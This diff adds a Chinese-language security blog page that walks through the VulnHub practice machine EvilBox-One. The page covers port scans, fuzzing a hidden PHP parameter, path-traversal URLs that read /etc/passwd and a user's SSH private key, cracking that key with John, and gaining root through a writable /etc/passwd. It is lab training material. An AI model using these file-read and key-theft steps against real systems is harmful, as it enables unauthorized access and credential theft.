@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>vulnhub靶机EvilBox---One - 信息安全实验室</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@400;500;700&family=Albert+Sans:wght@400;500;600&display=swap" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@400;500;700&family=Albert+Sans:wght@400;500;600&display=swap"></noscript>
+<link rel="stylesheet" href="../assets/style.css" media="print" onload="this.media='all'">
+<noscript><link rel="stylesheet" href="../assets/style.css"></noscript>
+</head>
+<body>
+<div class="mk-scanline"></div>
+<div class="mk-container">
+
+<div class="mk-brand fade-up">
+  <span class="mk-mark"></span>
+  <span class="mk-wordmark">// HIMOBRINE</span>
+</div>
+
+<div id="mkNavSentinel"></div>
+
+<div class="mk-nav-wrap" id="mkNavWrap">
+  <nav class="mk-nav">
+    <a href="../index.html" class="mk-nav-link">首页</a>
+    <a href="../tags/list.html?tag=漏洞分析" class="mk-nav-link">漏洞分析</a>
+    <a href="../tags/list.html?tag=安全工具" class="mk-nav-link">安全工具</a>
+    <a href="../tags/list.html?tag=学习笔记" class="mk-nav-link">学习笔记</a>
+    <a href="../tags/list.html?tag=逆向" class="mk-nav-link">逆向</a>
+    <a href="../tags/list.html?tag=调试" class="mk-nav-link">调试</a>
+    <a href="../tags/list.html" class="mk-nav-link">标签归档</a>
+  </nav>
+</div>
+
+<a href="../index.html" class="mk-back-link">[ &larr; ] BACK TO HOME</a>
+
+<article class="mk-bento-tile">
+  <div class="mk-post-date">2023 // 09 / 02</div>
+  <div class="mk-post-title">vulnhub靶机EvilBox---One</div>
+  <div class="mk-post-tags">
+    <a href="../tags/list.html?tag=vulnhub" class="mk-tag" style="background:#10b98122;color:#10b981;border:1px solid #10b98144">vulnhub</a>
+    <a href="../tags/list.html?tag=渗透测试" class="mk-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">渗透测试</a>
+  </div>
+
+  <div class="mk-post-content" >
+
+    <nav class="mk-toc">
+      <span class="mk-toc-title">// 目录</span>
+      <ul>
+        <li class="toc-h4"><a href="#setup">靶场搭建</a></li>
+        <li class="toc-h4"><a href="#info">信息收集</a></li>
+        <li class="toc-h5"><a href="#host-discovery">主机发现与端口扫描</a></li>
+        <li class="toc-h5"><a href="#vuln-scan">漏洞扫描</a></li>
+        <li class="toc-h4"><a href="#web-enum">Web 信息收集</a></li>
+        <li class="toc-h5"><a href="#ffuf">ffuf 参数爆破</a></li>
+        <li class="toc-h4"><a href="#lfi">LFI 任意文件读取</a></li>
+        <li class="toc-h4"><a href="#ssh-key">SSH 私钥窃取与破解</a></li>
+        <li class="toc-h4"><a href="#privesc">权限提升</a></li>
+        <li class="toc-h5"><a href="#flag">获取 Flag</a></li>
+      </ul>
+    </nav>
+
+    <h4 id="setup">靶场搭建</h4>
+    <p>靶机下载地址：<a href="https://www.vulnhub.com/entry/evilbox-one,736/" target="_blank">EvilBox: One ~ VulnHub</a></p>
+    <p>下载后使用 VMware 或 VirtualBox 导入即可。攻击机使用 Kali Linux，靶机网络设置为 NAT 模式。</p>
+
+    <h4 id="info">信息收集</h4>
+
+    <h5 id="host-discovery">主机发现与端口扫描</h5>
+    <pre><code>arp-scan -l</code></pre>
+    <p><img loading="lazy" src="../assets/eb_image001.png" alt="arp-scan 主机发现"></p>
+    <pre><code>nmap --min-rate 10000 -p- 192.168.21.153</code></pre>
+    <p><img loading="lazy" src="../assets/eb_image002.png" alt="nmap 全端口扫描"></p>
+    <p>开放 22（SSH）和 80（HTTP）端口，扫描详细信息：</p>
+    <pre><code>nmap -sV -sT -O -p22,80 192.168.21.153</code></pre>
+    <p><img loading="lazy" src="../assets/eb_image003.png" alt="nmap 版本扫描"></p>
+
+    <h5 id="vuln-scan">漏洞扫描</h5>
+    <pre><code>nmap --script=vuln -p22,80 192.168.21.153</code></pre>
+    <p><img loading="lazy" src="../assets/eb_image004.png" alt="nmap 漏洞扫描"></p>
+
+    <h4 id="web-enum">Web 信息收集</h4>
+    <p>访问 80 端口：</p>
+    <p><img loading="lazy" src="../assets/eb_image005.png" alt="80 端口页面"></p>
+    <p>查看 robots.txt：</p>
+    <p><img loading="lazy" src="../assets/eb_image006.png" alt="robots.txt"></p>
+    <p>发现 <code>/secret/</code> 目录，访问看看：</p>
+    <p><img loading="lazy" src="../assets/eb_image007.png" alt="/secret/ 目录"></p>
+    <p>扫描网站目录：</p>
+    <p><img loading="lazy" src="../assets/eb_image008.png" alt="目录扫描"></p>
+    <p>发现 <code>evil.php</code>，访问后页面全白：</p>
+    <p><img loading="lazy" src="../assets/eb_image009.png" alt="evil.php 空白页"></p>
+    <p>使用 nikto 进行漏洞扫描：</p>
+    <pre><code>nikto -host 192.168.21.153</code></pre>
+    <p><img loading="lazy" src="../assets/eb_image010.png" alt="nikto 扫描"></p>
+    <pre><code>nikto -host http://192.168.21.153/dvwa</code></pre>
+    <p><img loading="lazy" src="../assets/eb_image011.png" alt="nikto dvwa 目录"></p>
+    <p>用 nc 抓包发现异常返回值：</p>
+    <p><img loading="lazy" src="../assets/eb_image012.png" alt="nc 抓包"></p>
+    <p>确认存在参数接收，用 ffuf 爆破参数名：</p>
+
+    <h5 id="ffuf">ffuf 参数爆破</h5>
+    <pre><code>ffuf -w /root/Desktop/list -u http://192.168.21.153/secret/evil.php?FUZZ=../robots.txt -fs 0</code></pre>
+    <p><img loading="lazy" src="../assets/eb_image013.png" alt="ffuf 参数爆破"></p>
+    <p>发现 <code>command</code> 参数可用。</p>
+
+    <h4 id="lfi">LFI 任意文件读取</h4>
+    <p>尝试读取 <code>/etc/passwd</code>：</p>
+    <pre><code>http://192.168.21.153/secret/evil.php?command=/../../etc/passwd</code></pre>
+    <p><img loading="lazy" src="../assets/eb_image014.png" alt="读取 /etc/passwd"></p>
+    <p>确认存在 LFI 漏洞，发现用户 <code>mowree</code>。</p>
+
+    <h4 id="ssh-key">SSH 私钥窃取与破解</h4>
+    <p>直接读取 mowree 的 SSH 私钥：</p>
+    <pre><code>http://192.168.21.153/secret/evil.php?command=../../../../../../../../../home/mowree/.ssh/id_rsa</code></pre>
+    <p><img loading="lazy" src="../assets/eb_image015.png" alt="读取 SSH 私钥"></p>
+    <p>下载私钥文件，进行 hash 碰撞：</p>
+    <p><img loading="lazy" src="../assets/eb_image016.png" alt="下载私钥"></p>
+    <p>修改权限并转换格式：</p>
+    <pre><code>chmod 600 hash
+python3 ssh2john.py /root/Desktop/hash > /root/Desktop/idrsa</code></pre>
+    <p><img loading="lazy" src="../assets/eb_image017.png" alt="ssh2john 转换"></p>
+    <p>使用 John 爆破：</p>
+    <pre><code>john idrsa --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
+    <p><img loading="lazy" src="../assets/eb_image018.png" alt="John 爆破"></p>
+    <p>成功破解密码，使用私钥登录 mowree：</p>
+    <pre><code>ssh mowree@192.168.21.153 -i idrsa</code></pre>
+    <p><img loading="lazy" src="../assets/eb_image019.png" alt="SSH 登录"></p>
+
+    <h4 id="privesc">权限提升</h4>
+    <p>信息收集：</p>
+    <p><img loading="lazy" src="../assets/eb_image020.png" alt="信息收集"></p>
+    <p>检查 <code>/etc/passwd</code> 权限，发现可写：</p>
+    <p><img loading="lazy" src="../assets/eb_image021.png" alt="passwd 可写"></p>
+    <p>生成密码密文并写入 passwd：</p>
+    <p><img loading="lazy" src="../assets/eb_image022.png" alt="修改 root 密码"></p>
+    <pre><code>su root</code></pre>
+    <p><img loading="lazy" src="../assets/eb_image023.png" alt="su root"></p>
+    <p>成功获取 root 权限。</p>
+
+    <h4 id="flag">获取 Flag</h4>
+    <p><img loading="lazy" src="../assets/eb_image024.png" alt="flag 截图"></p>
+
+  </div>
+</article>
+
+<footer class="mk-footer">
+  <div class="mk-footer-brand"> RHODES ISLAND <span>://</span> SECURITY LAB <span>//</span> BLOG </div>
+  <div class="mk-footer-motto">&gt; 道可道，非常道，名可名，非常名</div>
+  <div class="mk-footer-links">
+    <a href="https://github.com/himobrine/wiki">GitHub</a>
+    <a href="../links.html">友情链接</a>
+    <a href="../index.html">Home</a>
+  </div>
+  <div class="mk-footer-copy">(c) 2026 // SECURITY BLOG</div></footer>
+
+<div class="mk-themedock" id="mkThemeDock">
+  <span class="mk-themedock-item active" data-theme="black">■</span>
+  <span class="mk-themedock-item" data-theme="white">□</span>
+  <span class="mk-themedock-item" data-theme="elysia">◇</span>
+  <span class="mk-themedock-item" data-theme="rei">▽</span>
+</div>
+
+<div class="mk-float-buttons">
+  <button class="mk-float-btn" id="mkThemeToggle" title="切换主题" aria-label="切换主题">■</button>
+  <button class="mk-float-btn" id="mkBackToTop" title="回到顶部" aria-label="回到顶部">⌃</button>
+</div>
+
+<script>
+const tocLinks = document.querySelectorAll('.mk-toc a');
+const tocTargets = [];
+tocLinks.forEach(a => {
+  const id = a.getAttribute('href').slice(1);
+  const el = document.getElementById(id);
+  if (el) tocTargets.push({ el, link: a });
+});
+const tocObs = new IntersectionObserver(
+  (entries) => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const match = tocTargets.find(t => t.el === e.target);
+        if (match) match.link.classList.add('active');
+      }
+    });
+  },
+  { threshold: 0.3, rootMargin: '-80px 0px -40% 0px' }
+);
+tocTargets.forEach(t => tocObs.observe(t.el));
+
+document.querySelectorAll('.mk-post-content pre').forEach(pre => {
+  const wrap = document.createElement('div');
+  wrap.className = 'mk-code-wrap';
+  pre.parentNode.insertBefore(wrap, pre);
+  wrap.appendChild(pre);
+
+  const lines = pre.textContent.split('\n').length;
+
+  const header = document.createElement('div');
+  header.className = 'mk-code-header';
+
+  const info = document.createElement('span');
+  info.className = 'mk-code-info';
+  info.textContent = `CODE // ${lines} line${lines === 1 ? '' : 's'}`;
+
+  const actions = document.createElement('div');
+  actions.className = 'mk-code-actions';
+
+  const copy = document.createElement('button');
+  copy.className = 'mk-code-btn mk-code-btn-copy'; copy.textContent = 'copy';
+  copy.onclick = (e) => {
+    e.stopPropagation();
+    navigator.clipboard.writeText(pre.textContent).then(() => {
+      copy.textContent = 'copied!'; copy.classList.add('copied');
+      setTimeout(() => { copy.textContent = 'copy'; copy.classList.remove('copied'); }, 1500);
+    });
+  };
+
+  const fold = document.createElement('button');
+  fold.className = 'mk-code-btn mk-code-btn-fold'; fold.textContent = '\u2191';
+  fold.onclick = (e) => {
+    e.stopPropagation();
+    wrap.classList.toggle('collapsed');
+    fold.textContent = wrap.classList.contains('collapsed') ? '\u2193' : '\u2191';
+  };
+  wrap.onclick = () => {
+    if (wrap.classList.contains('collapsed')) {
+      wrap.classList.remove('collapsed');
+      fold.textContent = '\u2191';
+    }
+  };
+
+  if (lines > 10) { wrap.classList.add('collapsed'); fold.textContent = '\u2193'; }
+
+  actions.append(copy, fold);
+  header.append(info, actions);
+  wrap.prepend(header);
+});
+</script>
+
+<div class="mk-graph-sidebar" id="mkGraphSidebar">
+  <div class="mk-graph-title"><a href="../graph.html">// 关系图谱</a></div>
+  <div id="graphContainer"></div>
+</div><script>
+(function(){
+var gs=document.getElementById("mkGraphSidebar"),gc=document.getElementById("graphContainer");
+if(!gs||!gc)return;
+var s=document.createElement("script");
+s.src="../assets/vis-network.min.js";
+s.onload=function(){
+  var d=document.createElement("script");
+  d.src="../assets/posts-data.js";
+  d.onload=function(){
+    var p=document.createElement("script");
+    p.textContent="const POSTS=POSTS_DATA.map(function(p){return{title:p.title,date:p.date,url:p.url.replace(\"posts/\",\"\"),excerpt:p.excerpt,tags:p.tags,primary:p.primary,secondary:p.secondary};});";
+    document.body.appendChild(p);
+    var g=document.createElement("script");
+    g.src="../assets/graph.js";
+    document.body.appendChild(g);
+  };
+  document.body.appendChild(d);
+};
+document.body.appendChild(s);
+})();
+</script>
+<script src="../assets/common.js"></script>
+
+</body>
+</html>
